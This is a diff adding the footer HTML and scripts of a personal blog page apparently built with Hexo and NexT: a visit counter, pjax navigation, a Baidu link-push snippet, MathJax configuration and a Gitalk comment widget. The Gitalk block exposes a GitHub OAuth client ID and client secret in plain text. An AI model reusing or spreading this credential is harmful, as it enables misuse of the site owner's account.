+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+  <script data-pjax>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'ebdb5b537395179b4514',
+      clientSecret: 'd0843e5853efe963ca9983db6cac3a1f9d736856',
+      repo        : 'noone40404.github.io',
+      owner       : 'noone40404',
+      admin       : ['noone40404'],
+      id          : 'b2dd1f980bd6b364b9d5435a2946750f',
+        language: 'zn-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+    </div>
+</body>
+</html>
